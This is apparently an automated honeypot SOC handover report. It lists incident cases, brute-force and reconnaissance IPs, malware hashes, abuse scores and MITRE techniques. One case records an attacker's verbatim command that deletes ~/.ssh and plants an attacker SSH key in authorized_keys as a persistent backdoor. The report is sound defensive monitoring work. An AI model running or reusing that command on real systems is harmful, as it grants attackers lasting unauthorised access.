### 🔴 HIGH · IR-ff68dd177f01

| Field | Detail |
|---|---|
| **Source IP** | `101.47.48[.]243` |
| **First Seen** | 2026-03-30 05:50 |
| **Last Seen** | 2026-03-30 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 05:50:20` | `cowrie.session.connect` |
| `2026-03-30 05:50:20` | `cowrie.client.version` |
| `2026-03-30 05:50:20` | `cowrie.client.kex` |
| `2026-03-30 05:50:20` | `cowrie.login.success` |
| `2026-03-30 05:50:21` | `cowrie.session.params` |
| `2026-03-30 05:50:21` | `cowrie.command.input` |
| `2026-03-30 05:50:21` | `cowrie.command.failed` |
| `2026-03-30 05:50:21` | `cowrie.log.closed` |
| `2026-03-30 05:50:21` | `cowrie.session.params` |
| `2026-03-30 05:50:21` | `cowrie.command.input` |
| `2026-03-30 05:50:21` | `cowrie.session.file_download` |
| `2026-03-30 05:50:21` | `cowrie.log.closed` |
| `2026-03-30 05:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.48[.]243` to AbuseIPDB if not already reported
- [ ] Block `101.47.48[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c07247efcf1f

| Field | Detail |
|---|---|
| **Source IP** | `101.47.48[.]243` |
| **First Seen** | 2026-03-30 05:50 |
| **Last Seen** | 2026-03-30 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 05:50:22` | `cowrie.session.connect` |
| `2026-03-30 05:50:22` | `cowrie.client.version` |
| `2026-03-30 05:50:22` | `cowrie.client.kex` |
| `2026-03-30 05:50:23` | `cowrie.login.success` |
| `2026-03-30 05:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.48[.]243` to AbuseIPDB if not already reported
- [ ] Block `101.47.48[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `218.78.60[.]105` | **3** | 2026-03-30 05:48 | 2026-03-30 05:56 | 6m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **3** | 2026-03-30 03:14 | 2026-03-30 03:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.153[.]92` | **2** | 2026-03-30 04:16 | 2026-03-30 04:16 | 2m | 0 | `T1592` | 🟢 LOW |
| `14.29.198[.]63` | **2** | 2026-03-30 04:19 | 2026-03-30 04:22 | 4m | 0 | `T1592` | 🟢 LOW |
| `213.55.79[.]195` | **2** | 2026-03-30 04:03 | 2026-03-30 05:03 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-03-30 03:33 | 2026-03-30 03:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.36.108[.]125` | 1 | 2026-03-30 03:32 | 2026-03-30 03:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.47.48[.]243` | 1 | 2026-03-30 05:50 | 2026-03-30 05:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.172.236[.]15` | 1 | 2026-03-30 04:18 | 2026-03-30 04:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-03-30 03:05 | 2026-03-30 03:05 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]70` | 1 | 2026-03-30 02:44 | 2026-03-30 02:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.23.117[.]116` | 1 | 2026-03-30 02:44 | 2026-03-30 02:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.147.162[.]92` | 1 | 2026-03-30 03:06 | 2026-03-30 03:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.160.140[.]138` | 1 | 2026-03-30 04:21 | 2026-03-30 04:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.161.164[.]24` | 1 | 2026-03-30 05:17 | 2026-03-30 05:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.165.205[.]5` | 1 | 2026-03-30 05:30 | 2026-03-30 05:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `117.223.152[.]94` | 1 | 2026-03-30 03:25 | 2026-03-30 03:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.200.229[.]33` | 1 | 2026-03-30 04:02 | 2026-03-30 04:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.234.195[.]41` | 1 | 2026-03-30 03:44 | 2026-03-30 03:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.189.226[.]81` | 1 | 2026-03-30 05:03 | 2026-03-30 05:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.29.4[.]251` | 1 | 2026-03-30 04:23 | 2026-03-30 04:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.73.168[.]9` | 1 | 2026-03-30 05:43 | 2026-03-30 05:43 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.187.230[.]38` | 1 | 2026-03-30 05:55 | 2026-03-30 05:55 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.20.251[.]70` | 1 | 2026-03-30 05:36 | 2026-03-30 05:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.30.212[.]99` | 1 | 2026-03-30 05:10 | 2026-03-30 05:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.11.220[.]50` | 1 | 2026-03-30 05:54 | 2026-03-30 05:54 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.168.60[.]146` | 1 | 2026-03-30 03:04 | 2026-03-30 03:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-03-30 05:48 | 2026-03-30 05:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.245[.]60` | 1 | 2026-03-30 04:15 | 2026-03-30 04:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.129.31[.]42` | 1 | 2026-03-30 03:24 | 2026-03-30 03:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.11[.]192` | 1 | 2026-03-30 05:03 | 2026-03-30 05:03 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.15.82[.]135` | 1 | 2026-03-30 04:11 | 2026-03-30 04:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.213.175[.]140` | 1 | 2026-03-30 05:46 | 2026-03-30 05:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.201.54[.]90` | 1 | 2026-03-30 04:58 | 2026-03-30 04:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.23.209[.]47` | 1 | 2026-03-30 04:23 | 2026-03-30 04:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.149.108[.]67` | 1 | 2026-03-30 04:30 | 2026-03-30 04:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.171.78[.]250` | 1 | 2026-03-30 04:51 | 2026-03-30 04:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.72.17[.]75` | 1 | 2026-03-30 04:23 | 2026-03-30 04:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.88.204[.]44` | 1 | 2026-03-30 03:32 | 2026-03-30 03:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-03-30 05:30 | 2026-03-30 05:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `200.106.49[.]149` | 1 | 2026-03-30 03:44 | 2026-03-30 03:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.166.198[.]180` | 1 | 2026-03-30 04:43 | 2026-03-30 04:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.4.156[.]254` | 1 | 2026-03-30 05:50 | 2026-03-30 05:50 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.130.90[.]166` | 1 | 2026-03-30 04:34 | 2026-03-30 04:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.6.62[.]31` | 1 | 2026-03-30 03:00 | 2026-03-30 03:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `60.249.251[.]88` | 1 | 2026-03-30 05:23 | 2026-03-30 05:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.12.86[.]90` | 1 | 2026-03-30 03:12 | 2026-03-30 03:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.198[.]159` | 1 | 2026-03-30 04:40 | 2026-03-30 04:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-03-30 04:09 | 2026-03-30 04:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `74.208.177[.]56` | 1 | 2026-03-30 04:43 | 2026-03-30 04:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.95.13[.]185` | 1 | 2026-03-30 02:59 | 2026-03-30 03:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `75.64.180[.]83` | 1 | 2026-03-30 03:51 | 2026-03-30 03:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.10.98[.]82` | 1 | 2026-03-30 03:24 | 2026-03-30 03:24 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.43.86[.]157` | 1 | 2026-03-30 03:38 | 2026-03-30 03:38 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **27/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `121.73.168[.]9` | NZ | One New Zealand Group Limited | **100** ⚠️ | 8 |
| `45.6.62[.]31` | MX | INTELVID S.A. DE C.V. | **100** ⚠️ | 3 |
| `113.160.140[.]138` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 26 |
| `74.95.13[.]185` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `180.76.146[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `20.13.147[.]55` | IE | Microsoft Corporation | **100** ⚠️ | 50 |
| `186.23.209[.]47` | AR | Telecentro S.A. | **100** ⚠️ | 50 |
| `122.187.230[.]38` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 31 |
| `183.171.11[.]192` | MY | Celcom Axiata Berhad | **100** ⚠️ | 12 |
| `65.20.198[.]159` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 65 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 36 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 79 cases |
| Tool 34  | Credential Extractor        | ✅ 50 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 60 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (5.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 54 recon entry/entries in table (5 group(s) consolidating 12 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T05:58:11Z_
